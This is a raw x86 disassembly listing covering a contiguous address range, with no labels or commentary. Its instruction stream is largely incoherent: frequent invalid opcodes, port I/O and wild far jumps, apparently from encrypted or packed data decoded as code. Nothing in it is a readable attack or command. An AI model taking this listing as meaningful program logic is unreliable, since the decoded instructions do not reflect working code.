  409bb6:	loope  0x409b7a
  409bb8:	out    0xe8,al
  409bba:	mov    dh,0xeb
  409bbc:	shl    DWORD PTR [ecx-0x45282d26],0xba
  409bc3:	retf   0xd6b8
  409bc6:	add    dh,al
  409bc8:	sar    esp,cl
  409bca:	(bad)  
  409bcb:	sar    ecx,cl
  409bcd:	(bad)  
  409bce:	out    0xe0,al
  409bd0:	add    eax,0xcadcfbcf
  409bd5:	or     DWORD PTR [ecx-0x4a2d1611],esi
  409bdb:	mov    bl,0xea
  409bdd:	(bad)  
  409bdf:	rol    dh,cl
  409be1:	mov    dh,0xf3
  409be3:	into   
  409be4:	fiadd  DWORD PTR [ebx]
  409be6:	dec    esi
  409be8:	fndisi(8087 only) 
  409bea:	repz cli 
  409bec:	vpsubsw xmm0,xmm5,xmm1
  409bf0:	leave  
  409bf1:	add    bl,bh
  409bf3:	cld    
  409bf4:	(bad)  
  409bf5:	cld    
  409bf6:	rol    ecx,cl
  409bf8:	ret    
  409bf9:	repz fdiv QWORD PTR [esi-0x44392c35]
  409c00:	bnd lock repz jmp 0x409bd7
  409c05:	leave  
  409c06:	repnz icebp 
  409c08:	out    dx,eax
  409c09:	in     eax,dx
  409c0a:	mov    ebx,0xc6cbc6bc
  409c0f:	xlat   BYTE PTR ds:[ebx]
  409c10:	shl    ah,0xec
  409c13:	vpmaxub ymm4,ymm4,ymm2
  409c17:	jmp    0x409be0
  409c19:	aad    0xb2
  409c1b:	frstpm(287 only) 
  409c1d:	jmp    0xbeb8:0xdbe7ebbb
  409c24:	in     al,dx
  409c25:	std    
  409c26:	std    
  409c27:	cli    
  409c28:	std    
  409c29:	loope  0x409c1e
  409c2b:	add    edx,esi
  409c2d:	jecxz  0x409c0c
  409c2f:	or     ecx,ebx
  409c31:	fucom  st(7)
  409c33:	out    0xec,al
  409c35:	fisubr DWORD PTR [edx-0x12421e39]
  409c3b:	aam    0xc3
  409c3d:	out    0xe6,al
  409c3f:	int    0xcc
  409c41:	int    0xf8
  409c43:	(bad)  
  409c45:	mov    esi,0xeef5f7ec
  409c4a:	std    
  409c4b:	(bad)  
  409c4c:	lock add eax,0xfedce505
  409c52:	or     ch,cl
  409c54:	repz out 0xa9,eax
  409c57:	rcl    bl,0xac
  409c5a:	idiv   bl
  409c5c:	(bad)  [eax+eiz*8-0x37063125]
  409c63:	mov    esi,0xd6c1dccf
  409c68:	call   edi
  409c6a:	int    0x2
  409c6c:	loop   0x409c30
  409c6e:	jecxz  0x409c6e
  409c70:	loop   0x409c7d
  409c72:	add    ah,al
  409c74:	push   es
  409c75:	jmp    0xb00d6f57
  409c7a:	(bad)  
  409c7b:	mov    esp,0xf1d4f9e7
  409c80:	in     al,0xd9
  409c82:	les    edi,FWORD PTR [edx-0x5134b09]
  409c88:	(bad)  
  409c8a:	(bad)
  409c8d:	test   DWORD PTR [eax],0xe8c5dade
  409c93:	int3   
  409c94:	in     eax,0xf1
  409c96:	(bad)  
  409c97:	ffreep st(3)
  409c99:	repz ret 0xeae1
  409c9d:	loop   0x409c6d
  409c9f:	sar    ecx,1
  409ca1:	lock mov bl,0xf2
  409ca4:	(bad)  
  409ca6:	fcmovnb st,st(0)
  409ca8:	div    ecx
  409caa:	stc    
  409cab:	(bad)  
  409cac:	idiv   cl
  409cae:	(bad)  
  409cb0:	fcomp  st(0)
  409cb2:	fisttp QWORD PTR [ecx]
  409cb4:	push   cs
  409cb5:	pop    es
  409cb6:	mov    esp,0xd7d7d3f3
  409cbb:	retf   
  409cbc:	retf   
  409cbd:	rol    ecx,cl
  409cbf:	repz mov dh,0xe8
  409cc2:	mov    edi,0xc3c903be
  409cc7:	sti    
  409cc8:	fcomip st,st(3)
  409cca:	ret    0xd5e0
  409ccd:	(bad)  
  409cce:	xlat   BYTE PTR ds:[ebx]
  409ccf:	clc    
  409cd0:	(bad)  
  409cd2:	(bad)  
  409cd4:	rol    DWORD PTR ds:0xe3d7e8c5,cl
  409cda:	lods   al,BYTE PTR ds:[esi]
  409cdb:	lock call 0xd21a90db
  409ce1:	call   0xf73858d8
  409ce6:	(bad)  
  409ce8:	ret    
  409ce9:	out    dx,al
  409cea:	neg    ecx
  409cec:	(bad)  
  409ced:	aad    0xc9
  409cef:	in     al,0x2
  409cf1:	jmp    0xebbe:0xceefe6c8
  409cf8:	fdivrp st(2),st
  409cfa:	mov    dl,0xd1
  409cfc:	retf   
  409cfd:	mov    ch,0xc0
  409cff:	mov    cl,0xea
  409d01:	(bad)  
  409d02:	leave  
  409d03:	into   
  409d04:	cli    
  409d05:	repnz cld 
  409d07:	add    ah,bh
  409d09:	clc    
  409d0a:	xlat   BYTE PTR ds:[ebx]
  409d0b:	std    
  409d0c:	(bad)  
  409d0d:	(bad)  
  409d0f:	not    bh
  409d11:	aad    0x8
  409d13:	add    bl,dh
  409d15:	cld    
  409d16:	call   0xef108cc8
  409d1b:	mov    ah,0xd5
  409d1d:	repz in eax,0xba
  409d20:	mov    ch,0xb8
  409d22:	fnstcw WORD PTR [esi-0x43104348]
  409d28:	mov    esp,0x6c506dc
  409d2d:	jmp    0x60a:0xd4d5caf8
  409d34:	out    0xe3,al
  409d36:	jmp    0xc4ac:0xe6c8afe6
  409d3d:	aam    0xca
  409d3f:	loopne 0x409d32
  409d41:	std    
  409d42:	hlt    
  409d43:	lock std 
  409d45:	(bad)  
  409d46:	iret   
  409d47:	int3   
  409d48:	out    dx,eax
  409d49:	repnz mov edi,0xdc0ae5f4
  409d4f:	test   edx,0xc4c508c0
  409d55:	(bad)  
  409d57:	shl    ecx,1
  409d59:	mov    esp,0xeee5b0ca
  409d5e:	ror    esi,1
  409d60:	shr    edx,1
  409d62:	(bad)  
  409d63:	cld    
  409d64:	retf   
  409d65:	retf   0xecba
  409d68:	push   es
  409d69:	aad    0x4
  409d6b:	push   ebx
  409d6d:	fst    st(7)
  409d6f:	loop   0x409d66
  409d71:	add    al,0xf4
  409d73:	loope  0x409d79
  409d75:	stc    
  409d76:	out    0xcc,eax
  409d78:	out    0xac,al
  409d7a:	loopne 0x409d2e
  409d7c:	lods   al,BYTE PTR ds:[esi]
  409d7d:	shl    al,cl
  409d7f:	repz in al,0xf1
  409d82:	lock les edi,FWORD PTR [esi-0x1e0f0e34]
  409d89:	add    dl,ah
  409d8b:	(bad)  
  409d8c:	add    eax,0xffc7e4fe
  409d91:	(bad)  
  409d92:	clc    
  409d93:	enter  0xcfca,0xc9
  409d97:	jecxz  0x409d80
  409d99:	shl    ah,1
  409d9b:	out    0xc7,eax
  409d9d:	fprem  
  409d9f:	out    0xe9,al
  409da1:	in     al,dx
  409da2:	int    0xe9
  409da4:	mov    eax,0xf5ffeeba
  409da9:	aam    0xd9
  409dab:	sar    BYTE PTR [ebx+ebx*8+0xfe4e7c1],0xda
  409db3:	fucomp st(7)
  409db5:	fcmovbe st,st(3)
  409db7:	retf   
  409db8:	repz mov dh,0xab
  409dbb:	loopne 0x409d88
  409dbd:	mov    edx,0xb7c8cfda
  409dc2:	hlt    
  409dc3:	mov    ebp,0xe0f1dfd5
  409dc8:	(bad)  
  409dc9:	add    esi,eax
  409dcb:	add    al,0xc7
  409dcd:	add    al,BYTE PTR [eax]
  409dcf:	stc    
  409dd0:	test   bh,0xa
  409dd3:	retf   
  409dd4:	out    0x5,al
  409dd6:	mov    ebp,0xe4c2d3ea
  409ddb:	(bad)
  409dde:	shr    edi,cl
  409de0:	lds    esi,FWORD PTR [ecx+edi*8-0xffe4a09]
  409de7:	shl    dl,1
  409de9:	int3   
  409dea:	add    dl,dh
  409dec:	fild   WORD PTR [ecx]
  409dee:	hlt    
  409def:	jmp    esp
  409df1:	iret   
  409df2:	add    eax,0xc4c8c10e
  409df7:	into   
  409df8:	loopne 0x409dcc
  409dfa:	leave  
  409dfb:	jecxz  0x409da9
  409dfd:	lock mov ch,0xb9
  409e00:	(bad)  
  409e01:	hlt    
  409e02:	(bad)  
  409e05:	out    dx,eax
  409e06:	into   
  409e07:	shl    edx,1
  409e09:	(bad)  
  409e0b:	shl    ecx,cl
  409e0d:	icebp  
  409e0e:	add    al,0xe4
  409e10:	out    dx,eax
  409e11:	in     al,0xe8
  409e13:	hlt    
  409e14:	repz fmul st,st(5)
  409e17:	jecxz  0x409df7
  409e19:	out    dx,al
  409e1a:	in     al,0xf1
  409e1c:	lods   al,BYTE PTR ds:[esi]
  409e1d:	into   
  409e1e:	sar    BYTE PTR [eax-0x3324634],cl
  409e24:	lock repz repz (bad) 
  409e29:	inc    BYTE PTR [edi]
  409e2b:	mov    edx,0xcac6dce1
  409e30:	(bad)  
  409e31:	(bad)  
  409e33:	fadd   st,st(5)
  409e35:	out    dx,al
  409e36:	mov    bl,0xc6
  409e38:	mov    al,0xf3
  409e3a:	mov    bh,0xe4
  409e3c:	loop   0x409e02
  409e3e:	iret   
  409e3f:	xlat   BYTE PTR ds:[ebx]
  409e40:	mov    edi,0xd6f1d7c4
  409e45:	sti    
  409e46:	cli    
  409e47:	fdivrp st(4),st
  409e49:	add    ebx,edi
  409e4b:	fild   DWORD PTR [esi]
  409e4d:	out    0x0,al
  409e4f:	call   0x2109d30
  409e54:	add    eax,0xa8d2d201
  409e59:	out    0xd0,al
  409e5b:	shl    DWORD PTR [ebp-0x62a4d1f],1
  409e61:	jmp    0xb8db:0xbfbab2ce
  409e68:	shl    bh,0xd5
  409e6b:	xlat   BYTE PTR ds:[ebx]
  409e6c:	or     ah,ch
  409e6e:	aam    0xfc
  409e70:	retf   0xdb
  409e73:	fcmovu st,st(6)
  409e75:	push   es
  409e76:	rol    esi,1
  409e78:	out    0xc4,eax
  409e7a:	in     al,0xcf
  409e7c:	in     eax,dx
  409e7d:	mov    edx,0xe5bbe8ce
  409e82:	mov    edi,0xf702b4b2
  409e87:	mov    dh,0xb5
  409e89:	(bad)  
  409e8b:	cmc    
  409e8c:	fmul   QWORD PTR [ebx]
  409e8e:	(bad)  
  409e8f:	jmp    0x409e6a
  409e91:	mov    esp,0xcefbe1d9
  409e96:	int    0xd3
  409e98:	loope  0x409e6c
  409e9a:	mov    ch,0xea
  409e9c:	jecxz  0x409e93
  409e9e:	leave  
  409e9f:	retf   
  409ea0:	into   
  409ea1:	fcmovbe st,st(4)
  409ea3:	out    dx,eax
  409ea4:	into   
  409ea5:	add    eax,edx
  409ea7:	shr    esi,0xda
  409eaa:	int3   
  409eab:	loop   0x409ea7
  409ead:	fsubr  st(1),st
  409eaf:	lds    eax,FWORD PTR [ebx]
  409eb1:	sti    
  409eb2:	iret   
  409eb3:	pop    es
  409eb4:	pop    es
  409eb5:	out    dx,al
  409eb6:	out    0xcf,eax
  409eb8:	out    dx,eax
  409eb9:	lds    esi,FWORD PTR [ebp-0x4a4d2c0f]
  409ebf:	shl    esi,1
  409ec1:	fistp  QWORD PTR [ecx-0x3efe4215]
  409ec7:	repnz cld 
  409ec9:	mov    ah,0x4
  409ecb:	(bad)  
  409ecc:	idiv   esi
  409ece:	(bad)  
  409ed0:	out    0x7,al
  409ed2:	aad    0xfe
  409ed4:	or     ebp,ecx
  409ed6:	fadd   st,st(0)
  409ed8:	mov    bh,0xf3
  409eda:	xlat   BYTE PTR ds:[ebx]
  409edb:	out    dx,al
  409edc:	icebp  
  409edd:	mov    ebx,0xe5cbf4db
  409ee2:	shl    esp,1
  409ee4:	mov    ah,0xca
  409ee6:	test   al,0xe6
  409ee9:	mov    esi,0xd0cbded7
  409eee:	les    ecx,FWORD PTR [eax]
  409ef0:	or     ah,bh
  409ef2:	les    eax,FWORD PTR [edi]
  409ef4:	iret   
  409ef5:	out    dx,al
  409ef6:	loopne 0x409ea9
  409ef8:	iret   
  409ef9:	imul   ah
  409efb:	enter  0xf4c6,0xca
  409eff:	mov    ebx,0xe3b9baeb
  409f04:	sar    BYTE PTR [ebx-0x1f331c45],cl
  409f0a:	shl    esi,1
  409f0c:	aad    0xd8
  409f0e:	ret    0xcfdc
  409f11:	jmp    0xb8e9:0xcb0e04c4
  409f18:	jmp    0xc0e9:0xd1f2e4e9
  409f1f:	shl    bl,cl
  409f21:	(bad)  
  409f22:	fnstsw WORD PTR [esi-0x43362124]
  409f28:	rcr    dl,cl
  409f2a:	loope  0x409f37
  409f2c:	add    eax,0xdd08c6e6
  409f31:	dec    BYTE PTR [esi]
  409f33:	out    dx,eax
  409f34:	push   es
  409f35:	repz ret 0xf3dd
  409f39:	ret    
  409f3a:	mov    cl,0xf2
  409f3c:	sti    
  409f3d:	out    0xe5,eax
  409f3f:	repz (bad) 
  409f41:	fstp   TBYTE PTR [edi-0xb283127]
  409f47:	mov    ebp,0xfcc6eed4
  409f4c:	or     ch,cl
  409f4e:	icebp  
  409f4f:	ret    0xc7e1
  409f52:	(bad)  
  409f54:	std    
  409f55:	fisubr DWORD PTR [ecx-0x19300d2f]
  409f5b:	hlt    
  409f5c:	fcmovu st,st(1)
  409f5e:	loope  0x409f45
  409f60:	mov    ebx,0xdffaf2da
  409f65:	iret   
  409f66:	mov    ebx,0xdcc2c1bd
  409f6b:	idiv   dh
  409f6d:	repnz xlat BYTE PTR ds:[ebx]
  409f6f:	out    0xd4,al
  409f71:	cld    
  409f72:	out    0xfd,al
  409f74:	in     eax,dx
  409f75:	adc    ch,ch
  409f77:	(bad)  
  409f78:	repz rcr esp,1
  409f7b:	out    dx,al
  409f7c:	in     al,dx
  409f7d:	leave  
  409f7e:	loope  0x409f4b
  409f80:	sti    
  409f81:	cli    
  409f82:	mov    bl,0xb8
  409f84:	add    bh,al
  409f86:	xlat   BYTE PTR ds:[ebx]
  409f87:	rcr    eax,cl
  409f89:	mov    edi,0xd8bdf0e0
  409f8e:	ret    
  409f8f:	retf   
  409f90:	fsub   st,st(7)
  409f92:	or     BYTE PTR ds:0xf0d1e6fa,al
  409f98:	repnz mov cl,0xcf
  409f9b:	shl    bl,1
  409f9d:	loope  0x409f88
  409f9f:	(bad)
  409fa2:	(bad)  
  409fa3:	(bad)  
  409fa4:	mov    esp,0xd8f7d3d1
  409fa9:	sar    ah,1
  409fab:	rol    ah,cl
  409fad:	repnz or DWORD PTR [ebx],eax
  409fb0:	or     al,ah
  409fb2:	or     eax,0xe1e9ffd4
  409fb7:	fidivr WORD PTR [ebp-0x1a4e141e]
  409fbd:	aam    0xcf
  409fbf:	int    0xc6
  409fc1:	aad    0xd9
  409fc3:	not    ch
  409fc5:	shl    bl,1
  409fc7:	std    
  409fc8:	loop   0x409f9e
  409fca:	neg    bh
  409fcc:	fadd   st(1),st
  409fce:	(bad)  
  409fd0:	loop   0x409fda
  409fd2:	std    
  409fd3:	in     al,dx
  409fd4:	jmp    ebx
  409fd6:	fldcw  WORD PTR [ebp-0x1e0c4f50]
  409fdc:	(bad)  
  409fdd:	int3   
  409fde:	mov    bh,0xb1
  409fe0:	icebp  
  409fe1:	(bad)  
  409fe2:	mov    ecx,0xc301e2cb
  409fe7:	std    
  409fe8:	fcomip st,st(0)
  409fea:	jecxz  0x409faa
  409fec:	(bad)  
  409fed:	or     esi,ecx
  409fef:	fcmovne st,st(2)
  409ff1:	clc    
  409ff2:	or     ah,dl
  409ff4:	(bad)  
  409ff6:	jmp    0xb4d4:0xc9e7bdaa
  409ffd:	icebp  
  409ffe:	into   
  409fff:	shr    ecx,1
  40a001:	out    0xd5,al
  40a003:	jmp    0xd7cc:0xf3cee2cd
  40a00a:	pop    es
  40a00b:	in     eax,0xfa
  40a00d:	sar    ch,1
  40a00f:	enter  0xdff6,0xc6
  40a013:	int    0xe2
  40a015:	fcmove st,st(1)
  40a017:	jecxz  0x40a005
  40a019:	jmp    0xd01863da
  40a01e:	sar    al,cl
  40a020:	mov    edx,0xeae8ccf8
  40a025:	clc    
  40a026:	loope  0x40a028
  40a028:	imul   ah
  40a02a:	aad    0xd0
  40a02c:	loop   0x40a02f
  40a02e:	or     dl,al
  40a030:	mov    ebp,0x3e007e9
  40a035:	add    esi,DWORD PTR [ecx-0x351c5a50]
  40a03b:	sti    
  40a03c:	jmp    0xe4d9:0xc8c6f4e6
  40a043:	call   0xbf377e1a
  40a048:	loope  0x40a021
  40a04a:	(bad)  
  40a04b:	rcr    ecx,1
  40a04d:	(bad)  
  40a04e:	in     al,0xc1
  40a050:	dec    BYTE PTR [edi]
  40a052:	add    cl,BYTE PTR [esi]
  40a054:	in     al,0xfc
  40a056:	mov    cl,0xb8
  40a058:	in     al,dx
  40a059:	repz in al,dx
  40a05b:	scas   al,BYTE PTR es:[edi]
  40a05c:	jecxz  0x40a057
  40a05e:	mov    ah,0xd9
  40a060:	(bad)  
  40a062:	int3   
  40a063:	sar    DWORD PTR [edx-0x250c0906],1
  40a069:	aad    0xc1
  40a06b:	in     eax,0xb9
  40a06d:	loopne 0x40a067
  40a06f:	psubb  mm0,mm0
  40a072:	call   0xc648a939
  40a077:	fstp   st(7)
  40a079:	lds    ebp,FWORD PTR [esi-0x4b4d080f]
  40a07f:	cli    
  40a080:	fdivr  DWORD PTR [edx+0x3d3d0ce]
  40a086:	stc    
  40a087:	in     eax,dx
  40a088:	ret    
  40a089:	out    0xbc,al
  40a08b:	add    eax,0xe2f9ffe1
  40a090:	(bad)  
  40a091:	or     eax,0xcbe3cdee
  40a096:	retf   
  40a097:	call   0xc7268c93
  40a09c:	mov    dh,0xe6
  40a09e:	aam    0xf9
  40a0a0:	mov    eax,0xd0fff9c4
  40a0a5:	mov    ecx,0xd9f3d6fb
  40a0aa:	mov    esp,0xc7d105f4
  40a0af:	jmp    0x1285d7e
  40a0b4:	add    ecx,esi
  40a0b6:	retf   
  40a0b7:	out    dx,eax
  40a0b8:	mov    esp,0xd5ccf0f5
  40a0bd:	int3   
  40a0be:	loopne 0x40a0ab
  40a0c0:	cmc    
  40a0c1:	(bad)  
  40a0c3:	(bad)  
  40a0c4:	hlt    
  40a0c5:	idiv   bl
  40a0c7:	mov    ebp,0xc5deecce
  40a0cc:	jmp    0x40a0b9
  40a0ce:	xlat   BYTE PTR ds:[ebx]
  40a0cf:	(bad)  
  40a0d0:	in     eax,0xce
  40a0d2:	(bad)  
  40a0d4:	add    ebp,ebp
  40a0d6:	loopne 0x40a099
  40a0d8:	test   eax,0xefdbf3cd
  40a0dd:	out    0xaf,al
  40a0df:	icebp  
  40a0e0:	into   
  40a0e1:	sar    esp,cl
  40a0e3:	aad    0xba
  40a0e5:	test   ecx,0xf3f9dee2
  40a0eb:	loopne 0x40a0ed
  40a0ed:	ffreep st(7)
  40a0ef:	or     al,BYTE PTR [edx]
  40a0f1:	jecxz  0x40a0f8
  40a0f3:	(bad)  
  40a0f4:	out    dx,al
  40a0f5:	add    al,ah
  40a0f7:	retf   
  40a0f8:	(bad)
  40a0fb:	rcl    dh,1
  40a0fd:	retf   
  40a0fe:	retf   0xb5c8
  40a101:	imul   ebx
  40a103:	enter  0xdcbd,0xfe
  40a107:	cli    
  40a108:	cmc    
  40a109:	test   DWORD PTR [ebx+esi*8],0xfac0c10b
  40a110:	loope  0x40a111
  40a112:	pandn  mm4,mm5
  40a115:	rol    edi,cl
  40a117:	scas   eax,DWORD PTR es:[edi]
  40a118:	int3   
  40a119:	ret    0xe2f0
  40a11c:	shl    BYTE PTR [ebx-0x2419143c],cl
  40a122:	iret   
  40a123:	idiv   cl
  40a125:	xlat   BYTE PTR ds:[ebx]
  40a126:	add    eax,esp
  40a128:	(bad)  
  40a129:	fcmovnu st,st(6)
  40a12b:	idiv   eax
  40a12d:	mov    eax,0xcfc5da00
  40a132:	jmp    0xb224b41b
  40a137:	into   
  40a138:	int    0xb2
  40a13a:	leave  
  40a13b:	xlat   BYTE PTR ds:[ebx]
  40a13c:	(bad)
  40a13f:	mov    edx,0xd0d8d3f5
  40a144:	in     al,dx
  40a145:	mov    ecx,0xfdd8bef9
  40a14a:	add    BYTE PTR ds:0xfadfd9c3,al
  40a150:	mov    DWORD PTR [ecx],0xffe5d909
  40a156:	retf   
  40a157:	loop   0x40a119
  40a159:	loop   0x40a145
  40a15b:	iret   
  40a15c:	into   
  40a15d:	mov    bl,0xb2
  40a15f:	cmc    
  40a160:	aam    0xf9
  40a162:	lds    esi,FWORD PTR [edi+ebp*8-0x30291f13]
  40a169:	stc    
  40a16a:	add    dh,dl
  40a16c:	mov    ecx,0xbc2c607
  40a171:	(bad)
  40a174:	pop    es
  40a175:	(bad)  
  40a177:	into   
  40a178:	shl    dh,0xb0
  40a17b:	mov    bl,0xe7
  40a17d:	in     al,0xc1
  40a17f:	ftst   
  40a181:	cmc    
  40a182:	call   0xc30e987d
  40a187:	aad    0xd3
  40a189:	rcr    ebp,0xd6
  40a18c:	ret    0xeac3
  40a18f:	cli    
  40a190:	jmp    0x40a166
  40a192:	or     eax,0xdedeeaf3
  40a197:	icebp  
  40a198:	(bad)  
  40a199:	jmp    0x40a17d
  40a19b:	loope  0x40a191
  40a19d:	jmp    0xd11aa151
  40a1a2:	call   0xc31a5ea0
  40a1a7:	test   dl,0xf3
  40a1aa:	sar    ecx,1
  40a1ac:	add    ecx,DWORD PTR [edx]
  40a1ae:	stc    
  40a1af:	(bad)  
  40a1b1:	out    dx,al
  40a1b2:	sti    
  40a1b3:	fdivp  st(2),st
  40a1b5:	fcomip st,st(0)
  40a1b7:	ret    0xefcd
  40a1ba:	rcl    ebx,cl
  40a1bc:	jmp    0xc9e6:0xe6cdd6f7
  40a1c3:	mov    edx,0x1ccb0f1
  40a1c8:	(bad)  
  40a1c9:	repz neg edi
  40a1cc:	loop   0x40a190
  40a1ce:	test   BYTE PTR [ebx],0xe4
  40a1d1:	fabs   
  40a1d3:	stc    
  40a1d4:	(bad)
  40a1d7:	mov    cl,0xc9
  40a1d9:	call   0xd7f698a4
  40a1de:	out    0xf8,al
  40a1e0:	aad    0xfb
  40a1e2:	mov    ah,0x3
  40a1e4:	cli    
  40a1e5:	ret    
  40a1e6:	ror    dh,cl
  40a1e8:	sti    
  40a1e9:	fidivr WORD PTR [ebx-0x250f4205]
  40a1ef:	not    bh
  40a1f1:	sti    
  40a1f2:	out    dx,al
  40a1f3:	pavgw  mm5,mm2
  40a1f6:	mov    eax,0xb7b6d6e8
  40a1fb:	mov    bl,0xc7
  40a1fd:	jmp    0x40a1d8
  40a1ff:	lock (bad) 
  40a201:	idiv   DWORD PTR [edx-0x222c1c2d]
  40a207:	in     eax,dx
  40a208:	shl    dh,0xf8
  40a20b:	in     eax,0xff
  40a20d:	add    eax,0x5f4bec9
  40a212:	(bad)
  40a215:	dec    esi
  40a217:	mov    eax,0xc9e3c1d0
  40a21c:	aam    0xed
  40a21e:	aad    0xe4
  40a220:	out    0xc6,eax
  40a222:	test   bl,0xb5
  40a225:	(bad)  
  40a227:	mov    ebp,0xd4d7d1f2
  40a22c:	hlt    
  40a22d:	add    eax,0xc0e601c0
  40a232:	add    BYTE PTR [ebx],al
  40a234:	std    
  40a235:	repnz lods al,BYTE PTR ds:[esi]
  40a237:	lods   eax,DWORD PTR ds:[esi]
  40a238:	mov    bl,0xe1
  40a23a:	in     al,0xb2
  40a23c:	cmc    
  40a23d:	(bad)  
  40a23e:	cmc    
  40a23f:	into   
  40a240:	shl    BYTE PTR [eax-0x25223535],cl
  40a246:	mov    eax,0xc1c0b5be
  40a24b:	add    edi,ebx
  40a24d:	clc    
  40a24e:	add    ch,bh
  40a250:	out    dx,al
  40a251:	out    dx,al
  40a252:	int    0xe7
  40a254:	add    DWORD PTR [esi],ecx
  40a256:	ret    0xe3ee
  40a259:	shl    ah,1
  40a25b:	int    0xc3
  40a25d:	shl    edi,0xcd
  40a260:	(bad)  
  40a262:	mov    ebx,0xf4f1bff0
  40a267:	fdivr  DWORD PTR [esp+edi*8-0x29f5fafb]
  40a26e:	or     edi,ebp
  40a270:	add    DWORD PTR [esi],ecx
  40a272:	fxch   st(0)
  40a274:	repz clc 
  40a276:	mov    cl,0xef
  40a278:	iret   
  40a279:	(bad)  
  40a27a:	loopne 0x40a22f
  40a27c:	mov    bh,0xb2
  40a27e:	out    0xe0,al
  40a280:	clc    
  40a281:	retf   
  40a282:	in     eax,dx
  40a283:	cmc    
  40a284:	mov    edx,0xdfdec2ed
  40a289:	push   es
  40a28a:	add    dh,bh
  40a28c:	out    0xd2,eax
  40a28e:	cli    
  40a28f:	jmp    0x613:0xcff9eedd
  40a296:	loopne 0x40a258
  40a298:	mov    al,0xe1
  40a29a:	jecxz  0x40a282
  40a29c:	repz sar dl,cl
  40a29f:	not    esi
  40a2a1:	fstp   TBYTE PTR [ebp-0x700040c]
  40a2a7:	repz mov esi,0xd3f0f8da
  40a2ad:	add    dl,ah
  40a2af:	add    cl,al
  40a2b1:	sti    
  40a2b2:	loopne 0x40a296
  40a2b4:	jecxz  0x40a2b3
  40a2b6:	scas   eax,DWORD PTR es:[edi]
  40a2b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2b8:	in     al,0xec
  40a2ba:	mov    dh,0xd7
  40a2bc:	call   0xdf1075a3
  40a2c1:	call   0xd8f98db7
  40a2c6:	(bad)  
  40a2c8:	clc    
  40a2c9:	add    al,dh
  40a2cb:	mov    esi,0xe0e9ff0b
  40a2d0:	add    DWORD PTR [ecx],ecx
  40a2d2:	bswap  ebx
  40a2d4:	add    eax,DWORD PTR [edi]
  40a2d6:	mov    al,0xd3
  40a2d9:	jmp    0xcef1:0xf5d1aad6
  40a2e0:	mov    cl,0xc6
  40a2e2:	in     al,dx
  40a2e3:	sti    
  40a2e4:	cld    
  40a2e5:	into   
  40a2e6:	out    dx,eax
  40a2e7:	clc    
  40a2e8:	stc    
  40a2e9:	out    0xec,eax
  40a2eb:	in     eax,0xc1
  40a2ed:	add    esp,edx
  40a2ef:	retf   0xf8c9
  40a2f2:	cmc    
  40a2f3:	aam    0xf
  40a2f5:	jmp    0xd7ac:0xc5cfaff0
  40a2fc:	fcmove st,st(6)
  40a2fe:	into   
  40a2ff:	int    0xb5
  40a301:	hlt    
  40a302:	(bad)  
  40a304:	icebp  
  40a305:	int3   
  40a306:	neg    ch
  40a308:	aad    0xf0
  40a30a:	aam    0xda
  40a30c:	add    eax,0xf9c6dec1
  40a311:	loopne 0x40a314
  40a313:	push   cs
  40a314:	add    eax,0xc2e5cde7
  40a319:	cmc    
  40a31a:	mov    al,0xcd
  40a31c:	mov    bh,0xcb
  40a31e:	(bad)
  40a321:	mov    esi,0xfbbfd1d9
  40a326:	add    dl,dl
  40a328:	(bad)  
  40a32a:	call   edi
  40a32c:	(bad)  
  40a32d:	jecxz  0x40a338
  40a32f:	call   0xde367f35
  40a334:	retf   
  40a335:	adc    ah,bl
  40a337:	(bad)  
  40a338:	fcomip st,st(6)
  40a33a:	fucom  st(3)
  40a33c:	loope  0x40a302
  40a33e:	shr    cl,0xb1
  40a341:	(bad)  
  40a342:	lock shr edx,cl
  40a345:	fsubrp st(1),st
  40a347:	enter  0xddde,0xd0
  40a34b:	add    edx,edx
  40a34d:	add    eax,0xdbdef6d8
  40a352:	sti    
  40a353:	retf   
  40a354:	add    dl,bl
  40a356:	icebp  
  40a357:	(bad)  
  40a359:	out    0xbc,al
  40a35b:	jecxz  0x40a32c
  40a35d:	mov    ch,0xcd
  40a35f:	mov    ah,0xb5
  40a361:	mov    edi,0xf6bcf2dc
  40a366:	leave  
  40a367:	std    
  40a368:	aam    0xdb
  40a36a:	out    0xfe,eax
  40a36c:	fdiv   st,st(1)
  40a36e:	in     al,0xc6
  40a370:	push   cs
  40a371:	paddusb mm7,mm6
  40a374:	or     al,0xdd
  40a376:	retf   0xe5c3
  40a379:	mov    dl,0xdd
  40a37b:	shl    BYTE PTR [edx-0xf30322d],cl
  40a381:	out    dx,eax
  40a382:	mov    dh,0xd2
  40a384:	into   
  40a385:	repz (bad) 
  40a388:	(bad)  
  40a38a:	imul   bl
  40a38c:	(bad)  
  40a38d:	mov    eax,0xed080409
  40a392:	push   es
  40a393:	in     al,0xca
  40a395:	std    
  40a396:	mov    bl,0xcc
  40a398:	in     al,dx
  40a399:	ror    al,cl
  40a39b:	mov    cl,0xe4
  40a39d:	mov    ch,0xf1
  40a39f:	mov    dh,0xcd
  40a3a1:	lock repnz (bad) 
  40a3a4:	fucomip st,st(4)
  40a3a6:	std    
  40a3a7:	iret   
  40a3a8:	out    dx,al
  40a3a9:	fild   WORD PTR [eax]
  40a3ab:	push   es
  40a3ac:	fneni(8087 only) 
  40a3ae:	cli    
  40a3af:	enter  0xd6eb,0xd5
  40a3b3:	clc    
  40a3b4:	in     eax,dx
  40a3b5:	movsx  ecx,bp
  40a3b8:	scas   eax,DWORD PTR es:[edi]
  40a3b9:	mov    dl,0xc9
  40a3bb:	stos   BYTE PTR es:[edi],al
  40a3bc:	(bad)
  40a3bf:	cmc    
  40a3c0:	jmp    0xee186fad
  40a3c5:	retf   0xd3ed
  40a3c8:	out    0xf6,eax
  40a3ca:	icebp  
  40a3cb:	mov    esp,0xf7e7defb
  40a3d0:	mov    ebp,0xc800c5
  40a3d5:	loop   0x40a389
  40a3d7:	enter  0xb1e5,0xc4
  40a3db:	test   cl,0xb0
  40a3de:	jmp    0x40a3d6
  40a3e0:	cmc    
  40a3e1:	out    dx,al
  40a3e2:	fcmovbe st,st(3)
  40a3e4:	fucomp st(4)
  40a3e6:	cmc    
  40a3e7:	add    ebp,ecx
  40a3e9:	(bad)  
  40a3eb:	cmc    
  40a3ec:	(bad)  
  40a3ed:	cli    
  40a3ee:	sti    
  40a3ef:	aad    0xc7
  40a3f1:	cld    
  40a3f2:	loopne 0x40a3f9
  40a3f4:	call   0xf7e770df
  40a3f9:	shl    edi,1
  40a3fb:	mov    ah,0xc2
  40a3fd:	rcl    bl,cl
  40a3ff:	repnz mov ecx,0xf1bbefb0
  40a405:	stc    
  40a406:	loop   0x40a3ef
  40a408:	mov    ecx,0xf8f6d0f3
